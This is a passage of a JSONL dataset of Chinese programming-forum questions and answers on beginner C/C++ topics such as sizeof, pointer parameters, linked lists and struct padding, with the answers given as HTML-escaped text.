n+1; i++)         //输出所有项", "\n    {", "\n        printf(\"%d, \", fun(i));", "\n        if (i != 0 && i%5 == 0)     //每五项进行一次换行（第一行多一个第0项）", "\n            printf(\"\\n\");", "\n    }", "\n    printf(\"第 %d 项是：%d\\n\", n, fun(n)); //输出要求的项", "\n    return 0;", "\n}", "\n如果把int main()放在头文件的下面这个程序该怎么改", "\n\n", "谢谢您"]], "Tag": "程序设计"}
{"Answer": "sizeof是编译时确定，由编译时的编译参数确定。\r\n64位的处理器也可以用32位表示内存。\r\n就像在64位平台可以编译和运行32位的程序。\r\n所以出来4也没正常。出来8也不奇怪", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言的VS2013基础问题", ["int main() {", "\n    int a;", "\n    printf(\"%d\",sizeof(a));", "\n    getchar();", "\n}//输出来的是4啊，我的电脑Win8 64位啊。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;去掉两个for语句后面的分号&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言随机数填充数组出现问题", ["问题遇到的现象和发生背景", "\n", "利用时间随机函数取值填入6位数组，但是每次只有第六个数被填上了，FOR循环定义i = 0 开始但是永远显示先i = 6", "\n", "问题相关代码，请勿粘贴截图", "\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "#", "include", "<time.h>", "\n", "int", " ", "main", "(", "void", ")", "\n", "{\n    ", "int", " i, j;\n    ", "int", " value;\n    ", "int", " arr[", "6", "] = {", "0", "};\n    ", "time_t", " timer = ", "time", "(", "NULL", ");\n    ", "srand", " ((", "size_t", ")", "time", "(", "NULL", "));\n    ", "printf", "(", "\"%d\\n\"", ", ", "sizeof", "(arr) / ", "sizeof", "(arr[", "0", "]));\n    ", "for", " (i = ", "0", "; i < ", "sizeof", "(arr) / ", "sizeof", "(arr[", "0", "]); i++);\n    {\n        value = ", "rand", "() % ", "32", " + ", "1", ";\n        ", "printf", "(", "\"value = %02d\\n\"", ", value);\n        arr [i] = value;\n        ", "printf", "(", "\"i = %d\\n\"", ", i);\n        ", "for", " (j = ", "0", "; j < i; j++)\n        {\n            ", "if", " (arr[j] == value)\n            {\n                ", "break", ";\n            }\n        }\n        ", "printf", "(", "\"j = %d\\n\"", ", j);\n        ", "if", " (j != i)\n        {\n            i--;\n        }\n    }\n    ", "for", " (i = ", "0", "; i < ", "sizeof", "(arr) / ", "sizeof", "(arr[", "0", "]); i++);\n    {\n        ", "printf", "(", "\"arr[%d] = %02d\\n \"", ", i, arr[i]);\n        ", "printf", "(", "\"i = %d\\n\"", ", i);\n    }\n    ", "return", " ", "0", ";\n}\n\n\n", "\n", "运行结果及报错内容", "\n", "6", "value = 01", "i = 6", "j = 6", "arr[6] = 01", " i = 6", "\n", "我的解答思路和尝试过的方法", "\n", "中间的printf函数就是为了查看错误在哪，但是看不出来", "\n", "我想要达到的结果", "\n", "解决这个问题"]], "Tag": "程序设计"}
{"Answer": "https://blog.csdn.net/cai18381306175/article/details/78853562", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["利用链表实现对字母的插入、删除，错误是读取访问权限冲突，求问大佬这是指针的问题吗，请各位大佬帮忙修改（问题在delete函数星号内部）", ["#include<iostream>\n#include<stdlib.h>\n#include<malloc.h>\nusing namespace std;\n\ntypedef struct node\n{\n    char data;\n    struct node* next;\n}node, * pnode;\n\npnode create_list()\n{\n    int i;\n    pnode head = (pnode)malloc(sizeof(node));\n    if (!head)\n    {\n        cout << \"未成功分配内存\" << endl;\n        exit(-1);\n    }\n    pnode p = head;\n    for (i = 0; i < 25; i++)\n    {\n        p->data = 'A' + i;\n        p->next = (pnode)malloc(sizeof(node));\n        if (!p->next)\n        {\n            cout << \"未成功分配内存\" << endl;\n            exit(-1);\n        }\n        p = p->next;\n    }\n    p->data = 'A' + 25;\n    p->next = NULL;\n    return head;\n}\nint show_list(pnode p)\n{\n    while (p!= NULL)\n    {\n        cout << p->data << '-' << '>';\n        p = p->next;\n    }\n    if (p== NULL)\n    {\n        cout << \"NULL\" << endl;\n    }\n    return 0;\n}\nint insert_list(pnode p)\n{\n    char a;\n    cin >> a;\n    pnode pnew = (pnode)malloc(sizeof(node));\n    if (!pnew)\n    {\n        cout << \"内存未分配成功\" << endl;\n        exit(-1);\n    }\n    pnew->data = a;\n    pnew->next = NULL;\n    while (p != NULL)\n    {\n        if (p->data != a)\n        {\n            cout << \"wrong\" <<endl;\n            p = p->next;\n        }\n        else\n        {\n            pnew->next = p->next;\n            p->next = pnew;\n            break;\n        }\n    }\n    return 0;\n}\nint delete_list(pnode p)\n{\n    char a;\n    cin >> a;\n    pnode q;\n    q = NULL;\n    while (p != NULL)\n    {\n        if (p->data != a)\n        {\n            cout << \"wrong\" << endl;\n            q = p;\n            p = p->next;\n        }\n****if (p->data == a)****\n        {\n            q->next= p->next;\n            free(p);\n        }\n    }\n    return 0;\n}\nint main()\n{\n    pnode phead;\n    phead=create_list();\n    show_list(phead);\n    insert_list(phead);\n    show_list(phead);\n    delete_list(phead);\n    show_list(phead);\n    return 0;\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;#include&amp;lt;stdio.h&amp;gt;&lt;br /&gt;\n#include&amp;lt;stdlib.h&amp;gt;&lt;br /&gt;\n//void fun(char (*a)[3]);&lt;br /&gt;\n//void fun(char (*a)[3])&lt;br /&gt;\nvoid fun(char a[])&lt;br /&gt;\n{&lt;!-- --&gt;&lt;br /&gt;\n    printf(&amp;#34;%d\\n&amp;#34;, sizeof(a));&lt;br /&gt;\n}&lt;br /&gt;\nint main()&lt;br /&gt;\n{&lt;!-- --&gt;&lt;br /&gt;\n    char a[]&amp;#61;&amp;#34;gfcghbvbh&amp;#34;;&lt;br /&gt;\n    printf(&amp;#34;%d\\n&amp;#34;,sizeof(&amp;amp;a));//数组地址的长度&lt;br /&gt;\n    fun(a);//将a数组传递至fun函数&lt;br /&gt;\n    return 0;&lt;br /&gt;\n}&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言中如何将传数组到函数的参数中？", ["大佬们能帮帮孩子吗？", "\n\n", "\n", "#include<stdio.h>\n#include<stdlib.h>\n//void fun(char (*a)[3]);\n//void fun(char (*a)[3])\nvoid fun(char (*a)[3]);\nvoid fun(char (*a)[3])\n{\n\tprintf(\"%d\\n\", sizeof(a));\n}\n\nint main()\n{\n\tchar a[3];\n\tprintf(\"%d\\n\",sizeof(a));//数组地址的长度\n\tfun(&a);//将a数组传递至fun函数\n\treturn 0;\n}", "\n\n", "这段代码应该如何修改才能在调用函数fun的时候正确的计算出sizeof（a）？", "\n\n", "不管怎么修改我得出的结论都是8字节，而如果在主函数中直接使用printf得出的结果就是3字节。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你对指针理解的还不够透彻&amp;#xff0c;什么时候用到指针传参&amp;#xff1f;要修改外部变量&amp;#xff0c;比如说想修改int类型的变量&amp;#xff0c;参数应该是int*。而你现在需要修改char*类型的变量&amp;#xff0c;需要什么参数&amp;#xff1f;那肯定不能是char*了吧&amp;#xff0c;应该是char**。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于函数入参为指针的问题！(语言-c++、c)", ["初学者提问", "函数入参为指针的问题", "我定义了两个功能一样的函数，只是一个返回指针，一个返回int值，传入的参数是一个char 类型指针，我在函数里使用malloc在堆上开辟了空间，并使用snprintf往里面写了东西，为啥在主函数中打印传入的指针还是NULL啊，子函数运行完，堆上的内存没释放啊，难道是子函数运行完指针又指向了其他地方？怎么感觉和值传递一样？这要怎么解决，只能返回这个指针类型吗？", "代码如下：", "\n", "#", "include", " ", "<iostream>", "\n", "#", "include", " ", "<stdio.h>", "\n", "using", " ", "namespace", " std;\n\n", "int", " ", "fun2", "(", "char", " *s)", "\n", "{\n    ", "if", " (", "NULL", " != s)\n    {\n        ", "free", "(s);\n\n    }\n    s = (", "char", " *)", "malloc", "(", "sizeof", "(", "char", ") * ", "10", ");\n    ", "snprintf", "(s, ", "10", ", ", "\"012345%s\"", ", ", "\"sfd\"", ");\n    ", "return", " ", "1", ";\n}\n\n", "char", "* ", "fun3", "(", "char", " *s)", "\n", "{\n    ", "if", " (", "NULL", " != s)\n    {\n        ", "free", "(s);\n\n    }\n    s = (", "char", " *)", "malloc", "(", "sizeof", "(", "char", ") * ", "10", ");\n    ", "snprintf", "(s, ", "10", ", ", "\"012345%s\"", ", ", "\"ly\"", ");\n    ", "return", " s;\n\n}\n\n", "int", " ", "main", "()", "\n", "{\n    ", "char", "* s = ", "NULL", ";\n    ", "//const char* v = \"ds\";", "\n    ", "//fun2(s);", "\n    ", "//cout << \"fun2:\"<<s << endl;", "\n    ", "fun3", "(s);\n    ", "printf", "(", "\"%s\"", ", s);\n    cout <<endl<< ", "\"fun3:\"", " << ", "fun3", "(s) << endl;\n    ", "if", " (", "NULL", " != s)\n    {\n        ", "free", "(s);\n\n    }\n    ", "return", " ", "0", ";\n\n}\n\n", "\n", "结果：", "\n", "\n", "我定义了两个功能一样的函数，只是一个返回指针，一个返回int值，传入的参数是一个char 类型指针，我在函数里使用malloc在堆上开辟了空间，并使用snprintf往里面写了东西，为啥在主函数中打印传入的指针还是NULL啊，子函数运行完，堆上的内存没释放啊，难道是子函数运行完指针又指向了其他地方？怎么感觉和值传递一样？这要怎么解决，只能返回这个指针类型吗？"]], "Tag": "程序设计"}
{"Answer": "都有二进制，同时类的数据要是基本类型，不能有指针等", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Socket通信类传递出错", ["send(m_fd, (char*)&member, sizeof(CMember), 0);", "\n\n", "num = recv(connectfd, recvbuf, c_max_data_size, 0);", "\nmemcpy(&my_member, recvbuf, sizeof(recvbuf));", "\n\n", "这样写哪里错了？或者是对类有什么特殊的要求么？ 传递来的类对象数据乱码"]], "Tag": "程序设计"}
{"Answer": "InitLinkList(LinkList *L)\r\nStatus CreatLinkList(LinkList *L)\r\n这两个函数的借口定义是错误的, 要改变一个指针的指向，需要传递指针的地址，即所谓的\"二级指针\"\r\n\r\nStatus InitLinkList(LinkList **L)\r\n{\r\n     *L=(LinkList *)malloc(sizeof(LNode));\r\n     *L-&gt;next = NULL ;\r\n     return 0;\r\n}\r\n接口调用：\r\nLinkList *m;\r\nInitLinkList(&amp;m)", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用C语言实现数据结构的链表创建时出错", ["请教大家，下面的程序哪里有错啊？十分感谢", "\n\n", "#include \"stdio.h\"", "\n#include \"malloc.h\"", "\n#include \"stdlib.h\"", "\n#define NULL 0", "\n#define OK   1", "\n\n", "typedef int ElemType;", "\ntypedef int Status;", "\n\n", "typedef struct LNode{", "\n    ElemType      data;", "\n    struct LNode *next;", "\n}LNode,LinkList;", "\n\n", "Status InitLinkList(LinkList *L)", "\n{", "\n    L=(LinkList *)malloc(sizeof(LNode));", "\n    return 0;", "\n}", "\n\n", "Status CreatLinkList(LinkList *L)", "\n{", "\n    L=(LinkList *)malloc(sizeof(LNode));", "\n    L->next=NULL;", "\n    LinkList *p,*q;", "\n    p=L;", "\n    ElemType temp=0;", "\n    printf(\"请按递增的顺序输入数据,输入-1结束\\n\");", "\n    for(int i=0;;i++)", "\n    {   scanf(\"%d\",&temp);", "\n        if(temp == -1)break;", "\n        q=(LinkList *)malloc(sizeof(LNode));", "\n        q->data=temp;", "\n        q->next=NULL;", "\n        p->next=q;", "\n        p=q;", "\n        L->data++;", "\n    }", "\n    return OK;", "\n\n", "}", "\nStatus PrintfLinkList(LinkList *L)", "\n{", "\n    LinkList *p;", "\n    p=L->next;", "\n    while(p!=NULL)", "\n    {", "\n        printf(\"%d\\t\",p->data);", "\n        p=p->next;", "\n    }", "\n    printf(\"\\n\");", "\n    return 0;", "\n}", "\n\n", "void main()", "\n{", "\n    LinkList *m;", "\n    m=(LinkList *)malloc(sizeof(LNode));", "\n    CreatLinkList(m);", "\n    PrintfLinkList(m);", "\n}"]], "Tag": "程序设计"}
{"Answer": "才能改变LNode的L变量，你是想改变 L 的成员的值，还是改变 L 的地址呢？\r\n如果是前者，你的代码没有问题，肯定是可以改变的；如果是后者，怎么可能是后者！后者是一个变量，又不是指针，定义后的地址是不能改变的。\r\n想要改，就必须使用指针。如定义：LNode L = (List)malloc(sizeof(LNode)); 再按 creat(&amp;L); 来调用就可以改变 L 的地址 。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["单链表创建打印函数，用完creat再用get（打印函数）", ["#include", "\n#include", "\n#include", "\nusing namespace std;", "\n\n", "typedef struct LNode{", "\n    int data;", "\n    LNode* next;", "\n}LNode,*List;", "\n\n", "void creat(LNode* L){", "\n    List p ;", "\n    int n;", "\n    p= (List)malloc(sizeof(LNode));", "\n    L = p;", "\n    printf(\"请输入1(添加)或0(不添加):\\n\");", "\n    cin >> n;", "\n    while (n)", "\n    {", "\n        p = (List)malloc(sizeof(LNode));", "\n        printf(\"请输入节点数据：\\n\");", "\n        cin >> p->data;", "\n        p->next = p;", "\n        printf(\"请输入1(添加)或0(不添加):\\n\");", "\n        cin >> n;", "\n    }", "\n\n", "}", "\nvoid get(LNode* L){", "\n    List p = L;", "\n    if (p == NULL)exit(0);", "\n    while (p->next != NULL)", "\n    {", "\n        printf(\"节点数据：%d\\n\", p->next->data);", "\n        p = p->next;", "\n    }", "\n}", "\n\n", "void main(){", "\n    LNode L;", "\n    creat(&L);", "\n    get (&L);", "\n    }", "\n\n", "怎么才能改变LNode的L变量，指针不懂，为什么他没有改变啊\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;_msize&lt;br /&gt;Returns the size of a memory block allocated in the heap.&lt;/p&gt;\n&lt;p&gt;size_t _msize( void *memblock );&lt;/p&gt;\n&lt;p&gt;Routine Required Header Compatibility&lt;br /&gt;_msize &amp;lt;malloc.h&amp;gt; Win 95, Win NT &lt;/p&gt;\n&lt;p&gt;For additional compatibility information, see Compatibility in the Introduction.&lt;/p&gt;\n&lt;p&gt;Libraries&lt;/p&gt;\n&lt;p&gt;LIBC.LIB Single thread static library, retail version&lt;br /&gt;LIBCMT.LIB Multithread static library, retail version&lt;br /&gt;MSVCRT.LIB Import library for MSVCRT.DLL, retail version &lt;/p&gt;\n&lt;p&gt;Return Value&lt;/p&gt;\n&lt;p&gt;_msize returns the size (in bytes) as an unsigned integer.&lt;/p&gt;\n&lt;p&gt;Parameter&lt;/p&gt;\n&lt;p&gt;memblock&lt;/p&gt;\n&lt;p&gt;Pointer to memory block&lt;/p&gt;\n&lt;p&gt;Remarks&lt;/p&gt;\n&lt;p&gt;The _msize function returns the size, in bytes, of the memory block allocated by a call to calloc, malloc, or realloc.&lt;/p&gt;\n&lt;p&gt;When the application is linked with a debug version of the C run-time libraries, _msize resolves to _msize_dbg. For more information about how the heap is managed during the debugging process, see Using C Run-Time Library Debugging Support.&lt;/p&gt;\n&lt;p&gt;Example&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-comment\"&gt;/* REALLOC.C: This program allocates a block of memory for\n * buffer and then uses _msize to display the size of that\n * block. Next, it uses realloc to expand the amount of\n * memory used by buffer and then calls _msize again to\n * display the new amount of memory allocated to buffer.\n */&lt;/span&gt;\n\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;malloc.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;( &lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; )&lt;/span&gt;\n&lt;/span&gt;{\n   &lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; *buffer;\n   &lt;span class=\"hljs-type\"&gt;size_t&lt;/span&gt; size;\n\n   &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;( (buffer &amp;#61; (&lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; *)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;( &lt;span class=\"hljs-number\"&gt;1000&lt;/span&gt; * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;( &lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; ) )) &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt; )\n      &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;( &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; );\n\n   size &amp;#61; _msize( buffer );\n   &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;( &lt;span class=\"hljs-string\"&gt;&amp;#34;Size of block after malloc of 1000 longs: %u\\n&amp;#34;&lt;/span&gt;, size );\n\n   &lt;span class=\"hljs-comment\"&gt;/* Reallocate and show new size: */&lt;/span&gt;\n   &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;( (buffer &amp;#61; &lt;span class=\"hljs-built_in\"&gt;realloc&lt;/span&gt;( buffer, size &amp;#43; (&lt;span class=\"hljs-number\"&gt;1000&lt;/span&gt; * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;( &lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; )) )) \n        &amp;#61;&amp;#61;  &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt; )\n      &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;( &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; );\n   size &amp;#61; _msize( buffer );\n   &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;( &lt;span class=\"hljs-string\"&gt;&amp;#34;Size of block after realloc of 1000 more longs: %u\\n&amp;#34;&lt;/span&gt;, \n            size );\n\n   &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;( buffer );\n   &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;( &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; );\n}\n\n\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Output&lt;/p&gt;\n&lt;p&gt;Size of block after malloc of 1000 longs: 4000&lt;br /&gt;Size of block after realloc of 1000 more longs: 8000&lt;/p&gt;\n&lt;p&gt;Memory Allocation Routines&lt;/p&gt;\n&lt;p&gt;See Also   calloc, _expand, malloc, realloc&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc.h文件找不到malloc_usable_size", ["我要获取我分配的动态内存大小，我开始用的sizeof（p）无论分配多大，获取的值一直是4，我想可能不对。", "查看网上很多回答说可以用malloc_usable_size(p)获取", "但我引入头文件#include <malloc.h>，运行代码提示找不到malloc_usable_size() ，  C/c++都尝试了，一样的错误", "\n", "\n\n", "#", "include", " ", "<stdio.h>", ";", "\n", "#", "include", " ", "<malloc.h>", "\n\n", "int", " ", "main", "()", "\n", "{\n    ", "char", " *p = ", "malloc", "(", "100", ");\n    ", "char", " *h = p - ", "8", ";\n    ", "printf", "(", "\"%d\\n\"", ", ", "malloc_usable_size", "(p));\n\n    ", "return", " ", "0", ";\n}\n", "\n", "截图是我手动去查看malloc.h 文件确实没有找到 malloc_usable_size方法", "错误    LNK2019    无法解析的外部符号 _malloc_usable_size，该符号在函数 _main 中被引用    CLearn    E:\\code_data\\vs\\c_learn\\CLearn\\CLearn\\main.obj    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数据结构有字节对齐问题&amp;#xff0c;所以outfile.write((char*)&amp;amp;strHead, 14);是有问题的。因为其中有一个是int类型&amp;#xff0c;第一个短整型数据之后会空两个字节&amp;#xff0c;导致直接按结构变量写入会出现cc cc这个无效字节。应该逐个写入数据结构变量。&lt;br /&gt;outfile.write((char*)&amp;amp;strInfo, 40); 没有问题是这个结构运气不错&amp;#xff0c;全是int型&amp;#xff0c;有两个短整型正好填满一个int&amp;#xff0c;所以没有为了对齐增加空余字节。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在使用C++进行BMP位图处理时遇到的问题", ["问题遇到的现象和发生背景", "\n", "在使用C++学习图像处理时,遇到的一个小问题。", "现象：复制后的文件数据出现\"错位\",原因是多了两个字节", "背景：使用Visual studio 2022 处理BMP位图", "\n", "完整代码", "\n", "#include <iostream>", "\n", "#include <fstream>", "\n\nusing namespace std;\n\ntypedef struct  ", "//", "位图文件头格式  \n{\n    short int bfType;       ", "//", " 位图文件的类型，必须设置为BM    _**正是该部分数据出现问题**_\n    int bfSize;      ", "//", " 位图文件的大小，以字节为单位  \n    short int bfReserved1;", "//", " 位图文件保留字，必须设置为", "0", "   \n    short int bfReserved2;", "//", " 位图文件保留字，必须设置为", "0", " \n    short int bfOffBits;   ", "//", " 位图数据相对于位图文件头的偏移量表示,即位图点阵偏移量\n\n}HEAD;     ", "//", "实际上，使用sizeof(HEAD)==", "16", " 因为 sizeof以", "4", "字节为单位   _**我不清楚是不是这种问题**_\n\ntypedef struct  ", "//", "位图文件头信息\n{\n    int biSize; ", "//", "结构体字节的总数\n    int biWidth; ", "//", " 位图的宽度，以像素为单位\n    int biHeight; ", "//", " 位图的高度，以像素为单位\n    short int biPlanes; ", "//", " 目标设备的位平面数，必须为", "1", "\n    short int biBitCount; ", "//", " 每个像素的位数，必须是", "1", "（单色）、", "4", "（", "16", "色）、", "8", "（", "256", "色）或", "24", "（真彩色）\n    int biCompression; ", "//", " 位图的压缩类型，必须是", "0", "（不压缩）、", "1", "（BI-RLE8压缩类型）或", "2", "（BI-RLE4压缩类型）\n    int biSizeImage; ", "//", " 位图的大小，以字节为单位\n    int biXPeIsPerMeter; ", "//", " 位图的目标设备水平分辨率，以每米像素数为单位(水平像素数)\n    int biYPeIsPerMeter; ", "//", " 位图的目标设备垂直分辨率，以每米像素数为单位(垂直像素数）\n    int biClrUsed; ", "//", " 位图实际使用的颜色表中的颜色变址数,即使用的颜色数\n    int biClrImpotant; ", "//", " 位图显示过程中被认为重要颜色的变址数，即所使用的重要颜色数,为", "0", "时表示所有颜色都很重要\n\n}INFO; ", "//", "sizeof(INFO)==", "40", "正好为", "4", "倍数    **_是否因为此处结构体字节数正好是", "4", "的倍数才正常？_**\n\ntypedef struct   ", "//", "定义RGBQUAD类型结构体，储存一种颜色信息颜色\n{\n    unsigned char rgbBlue;      ", "//", "蓝色所占比重\n    unsigned char rgbGreen;     ", "//", "绿色所占比重\n    unsigned char rgbRed;       ", "//", "红色所占比重\n    unsigned char rgbReserved;  ", "//", "保留字节\n\n}RGBQUAD; ", "//", " sizeof(RGBQUAD)==", "4", "\n\nint main()\n{\n        HEAD strHead;\n        INFO strInfo;\n        RGBQUAD straPla[", "256", "]{};\n        unsigned char strPixel[", "262144", "];\n    \n        char szFilena_1[", "30", "] = { ", "\"C:\\\\LENA.BMP\"", " }, szFilena_2[", "30", "] = { ", "\"C:\\\\LENA2.BMP\"", "};   ", "//", "记录要处理的源文件与处理后的目的文件名\n    \n        ifstream infile;\n        ofstream outfile;\n\n        infile.open(szFilena_1,ios::binary);\n        \n        outfile.open(szFilena_2, ios::binary);\n\n        int nCounti;", "//", "用以实现循环中对颜色板数据的读取与写入\n\n        \n        ", "//", "读出原文件头 ", "14", "字节\n        infile.read((char*)&strHead.bfType, ", "2", ");\n        infile.read((char*)&strHead.bfSize, ", "4", ");\n        infile.read((char*)&strHead.bfReserved1, ", "2", ");\n        infile.read((char*)&strHead.bfReserved2, ", "2", ");\n        infile.read((char*)&strHead.bfOffBits, ", "4", ");\n\n        ", "//", "读出原文件信息头 ", "40", "字节          \n        infile.read((char*)&strInfo.biSize, ", "4", ");\n        infile.read((char*)&strInfo.biWidth, ", "4", ");\n        infile.read((char*)&strInfo.biHeight, ", "4", ");\n        infile.read((char*)&strInfo.biPlanes, ", "2", ");\n        infile.read((char*)&strInfo.biBitCount, ", "2", ");\n        infile.read((char*)&strInfo.biCompression, ", "4", ");\n        infile.read((char*)&strInfo.biSizeImage, ", "4", ");\n        infile.read((char*)&strInfo.biXPeIsPerMeter, ", "4", ");\n        infile.read((char*)&strInfo.biYPeIsPerMeter, ", "4", ");\n        infile.read((char*)&strInfo.biClrUsed, ", "4", ");\n        infile.read((char*)&strInfo.biClrImpotant, ", "4", ");\n\n        ", "//", "读出原文件颜色板                                        ", "//", "颜色板也没有错位\n        ", "for", " (nCounti = ", "0", "; nCounti < ", "256", "; nCounti++)\n        {\n            infile.read((char*)&straPla[nCounti], ", "4", ");\n        }\n\n        ", "//", "读取位图数据                                               ", "//", "位图数据也没有出现错位\n        ", "for", " (nCounti = ", "0", "; nCounti < ", "262144", "; nCounti++)\n        {\n            infile.read((char*)&strPixel[nCounti], ", "1", ");\n        }\n\n        ", "//", "写入文件头\n        outfile.write((char*)&strHead, ", "14", ");\n\n        ", "//", "写入文件信息头\n        outfile.write((char*)&strInfo, ", "40", ");\n\n        ", "//", "写入颜色板\n        ", "for", " (nCounti = ", "0", "; nCounti < ", "256", "; nCounti++)\n        {\n            outfile.write((char*)&straPla[nCounti], ", "4", ");\n        }\n\n        ", "//", "写入位图数据\n\n        ", "for", " (nCounti = ", "0", "; nCounti < ", "262144", "; nCounti++)\n        {\n            outfile.write((char*)&strPixel[nCounti], ", "1", ");\n        }\n\n        ", "//", "控制台输出文件信息          \n        cout << ", "\"bfType:\"", " << strHead.bfType << endl;\n        cout << ", "\"bfSize:\"", " << strHead.bfSize << endl;\n        cout << ", "\"bfReserved1:\"", " <<  strHead.bfReserved1 << endl;\n        cout << ", "\"bfReserved2:\"", " <<  strHead.bfReserved2 << endl;\n        cout << ", "\"bfOffBits:\"", " <<  strHead.bfOffBits << endl;\n\n        cout << ", "\"biSize :\"", " <<  strInfo.biSize << endl;\n        cout << ", "\"biWidth :\"", " <<  strInfo.biWidth << endl;\n        cout << ", "\"biHeight :\"", " <<  strInfo.biHeight << endl;\n        cout << ", "\"biPlanes :\"", " <<  strInfo.biPlanes << endl;\n        cout << ", "\"biBitCount :\"", " <<  strInfo.biBitCount << endl;\n        cout << ", "\"biCompression:\"", " <<  strInfo.biCompression << endl;\n        cout << ", "\"biSizeImage :\"", " << strInfo.biSizeImage << endl;\n        cout << ", "\"biXPeIsPerMeter :\"", " <<  strInfo.biXPeIsPerMeter << endl;\n        cout << ", "\"biYPeIsPerMeter:\"", " <<  strInfo.biYPeIsPerMeter << endl;\n        cout << ", "\"biClrUsed :\"", " <<  strInfo.biClrUsed << endl;\n        cout << ", "\"biClrImpotant :\"", " <<  strInfo.biClrImpotant << endl;\n    return ", "0", ";\n}\n\n", "\n", "运行结果", "\n", "无报错，控制台输出:", "原BMP位图 LENA.BMP以16进制打开:", "\n", "创建的BMP位图LENA2.BMP以16进制打开:", "\n", "尝试过的方法", "\n", "将写入文件头结构体 Head部分改为:", "\n", "//写入文件头", "\n        outfile.", "write", "((", "char", "*)&strHead.bfType, ", "2", ");\n        outfile.", "write", "((", "char", "*)&strHead.bfSize, ", "4", ");\n        outfile.", "write", "((", "char", "*)&strHead.bfReserved1, ", "2", ");\n        outfile.", "write", "((", "char", "*)&strHead.bfReserved2, ", "2", ");\n        outfile.", "write", "((", "char", "*)&strHead.bfOffBits, ", "4", ");\n\n", "\n", "所创建的BMP位图 LENA2.BMP能正常打开而且与原文件一模一样（本笨蛋只能想到这个.）", "\n", "希望的解决方案：", "\n", "就是想知道这种问题出在哪。凡是字节数为4的倍数都没有多字节的问题.", "以及范式的编程方法."]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;strlen 函数返回的是字符串的长度&amp;#xff0c;而 sizeof 返回的是数组的总大小。&lt;/p&gt;\n&lt;p&gt;在代码中&amp;#xff0c;定义了一个字符数组 d&amp;#xff0c;长度为 5 个字符。但是没有在数组末尾添加空字符 &amp;#39;\\0&amp;#39;&amp;#xff0c;也就是说&amp;#xff0c;数组并不是一个有效的字符串。&lt;/p&gt;\n&lt;p&gt;如果希望 strlen 函数能够正确计算字符串的长度&amp;#xff0c;就必须在数组末尾添加空字符。例如&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; d[] &amp;#61; {&lt;!-- --&gt;&lt;span class=\"hljs-string\"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#39;\\0&amp;#39;&lt;/span&gt;};\n&lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;strlen&lt;/span&gt;(d));  &lt;span class=\"hljs-comment\"&gt;// 输出 